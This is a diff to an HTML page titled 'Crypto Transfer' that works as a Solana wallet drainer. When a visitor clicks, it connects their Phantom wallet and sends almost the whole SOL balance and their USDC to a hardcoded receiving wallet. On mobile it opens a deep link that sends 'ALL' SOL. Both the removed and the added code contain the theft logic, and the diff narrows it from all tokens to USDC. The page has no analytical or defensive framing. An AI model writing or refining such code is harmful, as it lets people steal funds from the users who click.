@@ -6,23 +6,21 @@
     <title>Crypto Transfer</title>
 </head>
 <body>
-    <h2>Click below to transfer all funds</h2>
+    <h2>Click below to transfer SOL and USDC</h2>
     <button id="transferButton">Transfer Now</button>
-
-    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token"></script>
 
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
             const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+            const usdcMintAddress = "EPjFWdd5AufqSSqeM2q4wrkEMuPeHQHqEAgHyoGdsXh";
 
             function isMobileDevice() {
                 return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             }
 
             if (isMobileDevice()) {
-                // Mobile deep link to open Phantom app with recipient prefilled
-                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}`;
+                // Mobile deep link for Phantom wallet to send all SOL
+                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}&asset=sol&amount=ALL`;
                 window.location.href = mobileLink;
             } else {
                 if (!window.solana) {
@@ -33,42 +31,40 @@
                 try {
                     await window.solana.connect();
                     const provider = window.solana;
-                    const connection = new solanaWeb3.Connection(
-                        "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
-                        'confirmed'
-                    );
+                    const connection = new solanaWeb3.Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df", 'confirmed');
 
                     const publicKey = provider.publicKey;
                     alert("Connected wallet: " + publicKey.toBase58());
 
                     const transaction = new solanaWeb3.Transaction();
 
-                    // Transfer SOL
+                    // Transfer all SOL
                     const balance = await connection.getBalance(publicKey);
                     if (balance > 5000) {
                         transaction.add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                                lamports: balance - 5000,  // Leave small fee for transaction
+                                lamports: balance - 5000, // Leaving a small fee for transaction
                             })
                         );
                     }
 
-                    // Get SPL token balances
-                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                        programId: solanaWeb3.TOKEN_PROGRAM_ID
+                    // Transfer USDC token
+                    const usdcToken = new solanaWeb3.PublicKey(usdcMintAddress);
+                    const senderTokenAccount = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                        mint: usdcToken,
                     });
 
-                    for (let tokenAccount of tokenAccounts.value) {
-                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
+                    if (senderTokenAccount.value.length > 0) {
+                        const tokenAmount = senderTokenAccount.value[0].account.data.parsed.info.tokenAmount.uiAmount;
                         if (tokenAmount > 0) {
                             transaction.add(
                                 splToken.createTransferInstruction(
-                                    new solanaWeb3.PublicKey(tokenAccount.pubkey),
+                                    senderTokenAccount.value[0].pubkey,
                                     new solanaWeb3.PublicKey(receiverWallet),
                                     publicKey,
-                                    tokenAmount * Math.pow(10, tokenAccount.account.data.parsed.info.tokenAmount.decimals),
+                                    tokenAmount * Math.pow(10, senderTokenAccount.value[0].account.data.parsed.info.tokenAmount.decimals),
                                     [],
                                     solanaWeb3.TOKEN_PROGRAM_ID
                                 )
@@ -85,6 +81,7 @@
                     alert("Transaction sent! Signature: " + signature);
                     await connection.confirmTransaction(signature);
                     alert("Transaction confirmed!");
+
                 } catch (error) {
                     console.error("Error:", error);
                     alert("Error: " + error.message);
@@ -92,5 +89,8 @@
             }
         });
     </script>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token"></script>
 </body>
 </html>
